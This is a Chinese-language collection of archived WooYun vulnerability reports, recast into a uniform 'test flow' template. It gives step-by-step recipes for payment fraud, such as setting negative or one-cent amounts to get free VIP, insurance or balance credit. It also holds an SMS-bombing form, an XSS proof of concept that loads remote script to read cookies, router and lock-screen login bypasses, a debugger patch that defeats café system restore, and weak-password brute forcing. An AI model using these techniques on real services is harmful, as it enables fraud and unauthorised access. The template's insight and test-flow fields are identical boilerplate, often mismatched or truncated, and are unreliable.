**厂商**: 长城宽带 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 长城宽带的网上营业厅在线续费漏洞，可修改任意金额。打开长城宽带的官方商城，输入宽带的账号密码进入个人中心

**POC**: 没有支付，不过应该是没问题

**绕过**: 直接利用

**修复**: 加验证
---

---
### [wooyun-2014-074483] 中国零食网支付逻辑漏洞
**厂商**: 中国零食网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 支付漏洞，自冲 ￥400，妈妈再也不用担心我的零食！注册个账号买东西~使用的余额付款，不够~把邮费改成负数。再支付OK！抓包看看~邮费已变注：多次测试，只有tuangou.lingshi.com域下可以使用，且一个账号只有第一次消费会出现。

**POC**: 自冲 ￥400 妈妈再也不用担心我的零食~

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-05683] 某IM软件短信轰炸
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司虽然做了针对号码的频率限制，但未对发送者发送频率做限制，即被拦截后还可以发给下一个手机，继续轰炸 = =

**POC**: 构造表单：<form method="post" action="https://example.com/[已脱敏]"><input type="hidden" name="country" value="+86" /><input type="text" name="phone" /><input type="submit" /></form>提交即可

**绕过**: 直接利用

**修复**: 针对发送者ip增加限制 或 连续发送增加验证码
---

---
### [wooyun-2015-099659] Discuz X3.2 论坛逻辑漏洞可绕过支付虚拟币查看帖子内敏感内容
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: No code(未写爬虫代码，因为还有更简单利用方式）利用方式就是用Tools，模拟的搜索引擎针对国内社工库论坛，绕过金币提取内部分析的网盘链接，看漏洞证明！

**POC**: 被利用例子：https://example.com/[已脱敏] Mozilla/5.0 (compatible; Baiduspider/2.0; +https://example.com/[已脱敏])模拟蜘蛛截图：某社工库论坛爬取链接：上图没有看到密码，是因为，内部又设置了【回复可见】，必须回复才能继续，，当然，如果发

**绕过**: 过滤绕过

**修复**: 论坛没有打补丁的，每次发布设置回复可见，或设置其他权限！
---

---
### [wooyun-2014-052605] 茶树网课程支付逻辑漏洞一枚(免费购买任意VIP课程)
**厂商**: 茶树网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：https://example.com/[已脱敏]

**POC**: 地址：https://example.com/[已脱敏]  修改成 hdfZongMoney=0.01情况1：修改不是负数的时候，需要登录支付~然后支付成功~情况2：金额修改成负数的时候，直接支付成功~请求参数：hdfZongMoney=1000.00  修改成 hdfZongMoney=-1在进去一看，哎呀，成VIP了~

**绕过**: 直接利用

**修复**: 加强对URL地址里参数的安全~
---

---
### [wooyun-2010-058] 遨游浏览器跨域脚本漏洞
**厂商**: 傲游 | **年份**: 2010 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遨游浏览器一个external接口函数没有遵循同源策略，存在一个跨域脚本漏洞。漏洞函数external.max_newTab（），函数的功能是打开一个新的标签页。该函数存在一个时间竞争条件错误，可以突破同源策略跨域操作窗口对象，跨域执行任意脚本。同时遨游浏览器自定义开发的external接口函数设定了一个信任域，该信任域包括*.maxthon.cn等，结合*.maxthon.cn任意web应用的一个脚本漏洞就可以调用漏洞函数external.max_newTab（）执行跨域操作。

**POC**: POC：1. passport.maxthon.cn存在一个跨站脚本漏洞，通过跨站脚本漏洞可以调用漏洞函数，嵌入一个远程的js http://[IP已脱敏] = "alert(document.cookie);document.write('hacked by rayh4c#80sec.com')"t

**绕过**: 直接利用

**修复**: 1.修复*.maxthon.cn域名内的WEB应用漏洞。2.修复有漏洞的接口函数external.max_newTab（）。
---

---
### [wooyun-2016-0215312] 爱卡汽车网某重要系统设计逻辑缺陷(成功绕过验证码限制)影响内部敏感信息
**厂商**: 爱卡汽车网 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 爱卡办公系统https://example.com/[已脱敏]

**POC**: 在多次尝试以后，发现验证码是通过cookie中的PHPSESSID来判断的修改PHPSESSID，成功绕过了验证码限制一枚高权限账号员工考勤资产信息，看到了某员工用Mac办公  福利真好员工信息可导出，继续渗透。。。。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0163210] 星美国际影城某系统设计逻辑缺陷泄露公司内部信息
**厂商**: 星美国际影城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: OA系统：http://**.**.**.**/seeyon/index.jspfuzz下常用姓名top500密码123456包长396的都是可以进入的随便拿一个做实验

**POC**: 不修给你们老总打电话！

**绕过**: 直接利用

**修复**: 改密码！禁用弱口令
---

---
### [wooyun-2012-012310] 畅途网严重的支付漏洞
**厂商**: 畅途网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原理都是一样的，抓包修改表单，只是付款的时候，没有订单payCode，先查看一个正常的订单过程，然后伪造payCode，其中transDate是日期，payCode也跟日期相关的一个订单，还有preminuPayCode = payCode+1证明如下：

**POC**: 就到这一步了

**绕过**: 直接利用

**修复**: 你懂滴
---

---
### [wooyun-2011-02272] 某快递金融业务逻辑漏洞
**厂商**: 某快递金融 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某快递金融存在支付逻辑漏洞，可以允许用户1元变1亿元。这个漏洞在其他网站很难存在，原因是页面交互都使用了对字段做签名。但是某快递金融没做签名，导致支付金额可以被修改为任意数值。猜测成因是开发人员为了快速实现功能，而忽略了其中数据签名的步骤。可以想象，如果我充值1个亿，然后再使用取款功能，会产生神马效果。

**POC**: 1、登陆就不说了，来到充值页面。我的余额为1元。2、充值，选择某股份制银行。提交看到一个页面。3、确认这个页面，同时开启修改数据包。修改数据包中的金额，为1分。4、提交。某银行付账。5、成功！某银行扣了1分钱。6、查询某快递金融，充值了1元。

**绕过**: 直接利用

**修复**: 和银行交易时，做数据签名，对用户金额和订单签名。
---

---
### [wooyun-2015-0115022] p2p金融安全之金海贷严重逻辑漏洞
**厂商**: jinhaidai.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看图不说话：购买VIP功能存在逻辑支付漏洞，如图：请求如下：POST /vip/DirectBuy HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=e377d26dd868aacc3254314e9143485530f31d96&year_num=1&tradepwd=hellocmd将year_num的值修改成负数，然后提交购买，会发现帐号里多很多钱，如图：提现只是分分钟的事情，我也有机会成土豪的哈？不过做为一个有节操的白帽子，我只想第一时间告诉你们！俩个测试帐号分别是hellocmd，hellotest，请讲里面的RMB都归零吧。如果有可能把我这俩帐号注销了也成。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 购买功能进行验证，对年份数字进行判断，或者进行后端前面验证
---

---
### [wooyun-2015-0149469] UC浏览器处理TLS证书不当可被中间人攻击
**厂商**: UC Mobile | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试地址：http://**.**.**.**/iframe.html先来看看手机自带浏览器测试以上地址会是怎样是能够正确的拦截  并提示证书存在问题!在来看看UC浏览器访问之后会是怎样  如下中间人可利用在任意页插入图片,来窃取HTTPS网站的cookie ,做个小演示1.打开Fiddler  设置手机抓包POC如下:!DOCTYPE html><html><head><meta charset="utf-8" /><title>请稍后</title></head><body><img src="https://**.**.**.**"><img src="https://**.**.**.**" /><img src="https://**.**.**.**" /><img src="https://**.**.**.**" /></body></html>访问构造好的POCFiddl

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 完善TLS证书校验
---

---
### [wooyun-2015-0105243] 南宁气象信息查询系统触屏机沙盒绕过
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地点还是在区体育中心的政务服务中心，就在门口。气象信息查询系统，图如下

**POC**: 这次的比较简单，有一个地方可以直接下手，屏幕左边可以拉出一个触控的键盘点击键盘上面的工具--选项，任务栏就出现了。但是没办法直接显示桌面，OK的，来任务管理器把气象服务台那两个进程直接结束，OK里面还有拨VPN相关的文档看看同一个网段还有其他机器吗留个到此一游，走了

**绕过**: 直接利用

**修复**: 注意屏蔽下任务栏…………
---

---
### [wooyun-2013-041273] 网维大师蝌蚪取消网吧重启后系统还原
**厂商**: 网维大师 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网吧有驱动防火墙 有的驱动文件无法执行 所以我就看下他的还原系统用ollydbg直接附加进程通过调试我发现他的验证方法是 取你输入的密码+上用户名 然后加密成md5 来和系统正确的md5做对比当然他系统正确的MD5也可以直接看到 想得到密码解开MD5 去掉后面的用户就是密码了这里就是我这台机器的正确密码了 这个MD5 我去cmd5试了下 解不开但是我们可以暴力绕过验证密码程序当调试器跟踪到这个位置让这个00427450   /74 31           je short BarClien.00427483         不让他跳过去就可以暴力取消还原了  不让他跳过去方法很多 比如直接NOP 或者Z标志改0  eax寄存赋值1都可以到这里 想干嘛就干嘛了

**POC**: 网吧有驱动防火墙 有的驱动文件无法执行 所以我就看下他的还原系统用ollydbg直接附加进程通过调试我发现他的验证方法是 取你输入的密码+上用户名 然后加密成md5 来和系统正确的md5做对比当然他系统正确的MD5也可以直接看到 想得到密码解开MD5 去掉后面的用户就是密码了这里就是我这台机器的正确密码了 这个MD5 我去cmd5试了下 解不开但是我们可以暴力绕过验证密码程序当调试器跟踪到这个位置让这个00427450   /74 31           je short BarClien.00427483         不让他跳过去就可以暴力取消还原了  不让他跳过去方法很多 比如直接N

**绕过**: 过滤绕过

**修复**: 你们比我专业
---

---
### [wooyun-2014-052327] 某省电信支付漏洞可用1分钱购买全国流量卡
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 陕西电信网厅提供流量卡购买功能https://example.com/[已脱敏]

**POC**: 随便选个支付方式，提交并截包看到金额了吗，果断改成1并放行看到了没，支付提示出现了果断支付了成功，欸手机响了，流量卡密已经发过来了耶。这张送我了吧，求不查水表！

**绕过**: 直接利用

**修复**: 传递订单数据一定要签名验证，接受数据要验证金额涉及到钱的方面一定要更加谨慎！
---

---
### [wooyun-2016-0203791] 天安人寿支付漏洞（1分钱购买任意保险）
**厂商**: 天安人寿保险股份有限公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: tianan-life.com点击立即投保，抓包POST /qysq/womanSeason/createOrderInfo HTTP/1.1Host: mall.tianan-life.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0125646] p2p金融安全之网贷财富逻辑漏洞(可操作任意帖子)
**厂商**: 网贷财富 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-074100] 某电商平台某社交APP某些协议缺陷
**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 来往app对某些mobile协议的时候没有很好处理，导致应用可自动拨打电话、发送短信，facetime等……测试环境：ios 7.1.2来往app：version 5.2.1（14349）

**POC**: tel://10086sms://10086mailto://admin@某域名.com<html><head><title>v</title></head><body><a id="dial" href="tel:10086">test</a></body><script type="text/javascript"><!--window.onload = function(){window.location.href = document.getElementById("dial").href;};//--></script></html>来往没有很好的处理这些协议，在im （与好友交谈）还

**绕过**: 直接利用

**修复**: https://example.com/[已脱敏]
---

---
### [wooyun-2015-0105793] 手机某电商平台存在在米源自动售饭机购买不扣费的漏洞
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞属于手机某电商平台问题，手机某电商平台在使用当面付购买米源自动售饭机的饮料时，手机某电商平台不会扣费，想卖多少就买多少，我都买了好几天了，漏洞挺严重的，我在提乌云的同时（昨晚提交了一份，但是不详细，今天重新整了下），我也提交了某电商集团漏洞响应中心，希望尽快处理，全国有多少米源的自动售饭机我就不说，多大的损失也不说了，学生狗就是学安全的，自然就留意了一下我的某电商平台账号是：15508033697  可以看看我的消费记录

**POC**: 漏洞证明：证明的方式很简单，就是在米源自动售饭机上使用当面付购买饮料，某电商平台的余额会先增加相应的饮料价格金钱，然后再次扣除，所以相当于没有扣钱，我在使用手机某电商平台购买某电商平台上的其他物品时，都是正常的扣费，下面我就贴上手机某电商平台购买记录，小于5元钱都是在米源上当面付购买的饮料！！购买饮料异常信息但是不使用当面付，某电商平台的余额转账，购买等均为正常变化 （注：3-24号也为购买饮料记录，余额异常）今天早上我再测去测试了下，打开某电商平台看了消费记录，第一次购买依旧没有扣费，但是连续购买后却是扣费，有一定的时间间隔，就可以利用这个漏洞

**绕过**: 直接利用

**修复**: 这情况我也第一次遇到，你比我们更专业
---

---
### [wooyun-2015-0142087] 谁动了我的相机东芝SD存储卡（日产）存在逻辑漏洞可被攻击
**厂商**: toshiba.com.cn | **年份**: 2015 | **类型**: 设计不当

**元思考**: 触发信号: 功能测试

**洞察**: 设计不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞详细：日本东芝SD（TOSHIBA FlashAir w-03 Wireless LAN WL-SD ）存储卡存在逻辑漏洞，接入网络后无需验证即可拷贝删除照片甚至修改SD卡设置，且此产品没有复位按钮被修改后主人无法进入。黑客可利用此缺陷窃取或删除照片，修改配置文件使其失效报废。此产品第一次使用时虽有警告说明修改SSID及网络接入密码，但是其网络接入密码可被截取，同时由于缺乏其他同类产品管理界面的用户名密码验证或密码验证机制，导致逻辑漏洞的产生，导致一切安全策略形同虚设。破获网络密码非授权直接访问问题流程分析及整改方案

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0136926] 国泰君安95521发送任意短信查询手机开户信息
**厂商**: 国泰君安 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国泰君安Android手机开户客户端，存在短信任意发送问题，且数量无限制，并且可任意查询开户手机号个人信息，如身份证信息、开户信息、住址、手机、银行卡等大量敏感隐私信息。客户端的架构与某证券公司类似，估计出于同一家公司开发。同样问题出在了本地的http server上，本地http server，收到数据后通过内部加密库跟证券后台server交互，获取信息。本地server几处较为严重的问题，文题点都在reqxml的几个action中：1.60s发送短信限制实现是在客户端上，因此容易被攻击者利用短信轰炸2.短信发送内容本地生成，发送给server进行真正的发送短信，这个逻辑太可怕了，攻击者可以利用95521发送任何短信3.验证码为本地生成，验证码逻辑形同虚设，有很大的安全隐患。4.未登录状态下，手机号查询用户信息，返回信息过多，包含了身份证、住址、电话、邮箱等5.查询接口后台无任何数量频率限

**POC**: 任意短信发送：想想要是给全国人民用95521发一个 “中了500W信息，赶紧打手续费到XX帐号”，就好激动！用户信息枚举查询另附一张研发小哥的联系方式：

**绕过**: 直接利用

**修复**: 针对以上五条一一做修复，尽可能将验证逻辑放到server端，一定不能让客户端生成验证码，生成短信！！！还有release产品线上就不要带注释、测试代码了，很容易造成信息的泄漏。
---

---
### [wooyun-2015-0140703] 万能五笔输入法Win8登陆界面绕过
**厂商**: www.wnwb.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 测试程序下载万能五笔输入法最新版，http://**.**.**.**/gf/wnwb**.**.**.**.exe2. 操作步骤2.1 Win8下安装万能五笔输入法，进入锁屏界面（Win键+L）；2.2 调出“屏幕讲述人”操作界面，切换到万能五笔输入法；2.3 在万能五笔输入法中选择“设置”按钮后，依次选择“帮助”、“官方网站”；2.4 选择使用Chrome打开；2.5 Chrome中通过file:///C:/Windows/System32浏览系统目录，并下载cmd.exe；2.6 执行cmd.exe并添加测试账户；

**POC**: 2.1 ~ [IP已脱敏].6

**绕过**: 直接利用

**修复**: 在登陆界面下限制相关操作，可以参考其他输入法的处理。
---

---
### [wooyun-2014-084121] 真旅网某内部系统严重缺陷可爆破大量帐号
**厂商**: 真旅网集团 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 前人栽树，后人乘凉WooYun: 真旅网内部管理系统存在弱口令（导致可直接登陆内部论坛，可对其进行一系列的操作）此漏洞暴露出oa系统地址。厂商回复：admin用户已删，略屌。不过话说删用户就解决问题了么？#2 胆大心细，一探究竟话不多说，直接来到登录页面，尝试一下，提示“用户不存在”，还有验证码就在我要放弃，关闭页面的时候，不小心手滑了一下，点到查看源码了（上帝之手啊。。），然后看到了重点。手机登录隐藏验证码，果断手机打开看了下，真的隐藏了验证码。#3 深入虎穴，再续前缘既然隐藏了验证码，后端肯定也就不会判断验证码了，那就抓包看看，提交了什么数据。（第一张图是pc浏览器提交的，所以有验证码参数）修改一下参数，模拟手机登录成功绕过验证码验证码绕过了，另一个问题就是用户有哪些？根据登陆框处提示，可以以用户名、邮箱、员工号登录，用户名的命中率比较低，邮箱猜了几个admin，support，

**POC**: 遍历参数设置统计结果

**绕过**: 过滤绕过

**修复**: 如果真的非常注重移动端的用户体验，就把后端功能强化一下，至少单用户或ip登录尝试次数做一下限制。注意细节。
---

---
### [wooyun-2016-0176217] 西默科技智能无线路由器设计错误可随意登录
**厂商**: 上海西默通信技术有限公司 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 引用YY的帖子http://**.**.**.**/bugs/wooyun-2016-0174251，他的是一个链接自带cookie的，然后就无需cookie了。假如不知道他的问题链接呢？或者链接无法访问？那我这个方法是设置cookies，因为所有路由器登录的cookies值都是一样的，设置后就能登录。应该算是另一种登录绕过方法，厂商cookies值生成必须修改。

**POC**: 登录界面：**.**.**.**/，默认会跳到**.**.**.**/login.htm在登录界面用工具设置cookie为↓Cookie: login=login;再访问ip，**.**.**.**/，就可登录。附多几个案例，他帖子就有几十个案例了**.**.**.**/**.**.**.**/**.**.**.**/

**绕过**: 过滤绕过

**修复**: 你懂的比我多
---

---
### [wooyun-2013-033364] 筑龙网支付漏洞0.01元购买筑龙币
**厂商**: zhulong.com | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 半夜无聊，看了看以前找的漏洞，又检测了一遍筑龙网，结果又有收获了，开一年VIP，抓包看看，没验证呃，果断改价格，支付成功，VIP，测试筑龙币也可购买，看了下会员有100多万，有礼物嘛~~~建筑书也好

**POC**: 半夜无聊，看了看以前找的漏洞，又检测了一遍筑龙网，结果又有收获了，开一年VIP，抓包看看，没验证呃，果断改价格，支付成功，VIP，测试筑龙币也可购买，看了下会员有100多万，有礼物嘛~~~建筑书也好

**绕过**: 直接利用

**修复**: 你们会，哈哈
---

---
### [wooyun-2015-0116678] 悠哉旅游网支付逻辑漏洞(超低价出境游)
**厂商**: 悠哉旅游网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先选择一个处境游！和wooyun-2015-0107316原理一样！然后给儿童哪里加一个人，默认是一个成人0个儿童！然后将childnum改为-1(因为成人那个价格高，我想让变成正数)然后到支付页面！我就不支付了，400多也没人报！和wooyun-2015-0107316原理一样！

**POC**: 给高rank，我想换个手机！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070519] 抠抠网APP可下负金额订单#5
**厂商**: 抠抠（福建）电子商务有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: count修改为-1看下订单来后台看一下

**POC**: count修改为-1看下订单来后台看一下

**绕过**: 直接利用

**修复**: ···
---

---
### [wooyun-2014-087462] 某网络电话云端漏洞可实现强制实现午夜惊魂
**厂商**: 华夏亿信 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天测试的一款网络电话，叫做华夏亿信。朋友之前做过代理，说是与电信，联通，移动一起做的一个项目。（左下角那个APP，壁纸是我女友，不是我）官方网站：https://example.com/[已脱敏]

**POC**: 打开这款网络电话之后，输入你注册的账号，验证之后随便选择一个联系人拨打电话。这个时候进行抓包，抓到以下代码其中a参数代表的是你自己的号码，b参数代表的是你拨打的号码。比如说我通过这个APP拨打了一个电话给我女朋友，在发送完这段数据包之后，我的手机会接到一个匿名来电。在我接起这个匿名来电的时候，我女朋友就会接到我的电话。原理（来自某搜索引擎知道）：网络电话原理：网关将PSTN和Internet/Intranet连接起来，网关一侧连接Internet，另一侧与PSTN相连。它能够把来自Internet网的网络包经过解包、解压缩后，经过数／模变换成模拟语音信号传送给PSTN；也能够把来自PSTN的电话语音

**绕过**: 直接利用

**修复**: 在网络电话服务端做好验证和防注入等等措施。PS：送一封感谢信可好？
---

---
### [wooyun-2014-086812] 磨房网支持负金额支付
**厂商**: doyouhike.net | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 付金额支付的话 某电商平台 网银都没发库款但是只要金额为正数的话 某电商平台不能付款 网银可以付款成功

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-06034] 看到两个歪歪用一个账号好蛋疼
**厂商**: 广州多玩 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没啥好说的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ... ...
---

---
### [wooyun-2013-037354] 某搜索引擎杀毒任意加载bootkit
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主要问题可能是未对一些敏感系统文件进行保护，导致了可以被感染。我的例子中感染的是NTLDR，导致了可以写入恶意代码先于windows启动。参考电脑管家是拦截了，故而觉得这某搜索引擎杀毒的一个疏忽吧！需要POC程序可以联系.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止对NTLDR修改等另：可以不再送蓝牙耳机了？用不过来了。
---

---
### [wooyun-2014-072063] 某情侣应用登陆未做限制可撞库
**厂商**: xiaoenai.com | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-076383] 乌云众测某处功能存在逻辑漏洞
**厂商**: 乌云官方 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经过测试，众测提交漏洞的那个功能，只有第一次的时候会验证那个页面的验证码。也就是说，如果抓包后请求的话，第一次验证码为空，会提示验证码错误。 然后第二次就会请求成功，第三次、第四次......以后的提交请求都可以在验证码为空的情况下成功提交表单。然后也测试了一下主站，貌似不存在此问题。

**POC**: 这个地址的测试数据麻烦管理给清理下。https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 猜测这里是代码逻辑的问题。比如用于接收验证码的变量是code，验证的时候会和服务器上的code1去对比，然后code=code1的话，验证码就验证成功，然后成功提交表单。如果code和code1不一样的话，会提示错误，然后可能会防止验证码多次使用，应该是验证了一次后，又将code重新给赋值了，比如，
---

---
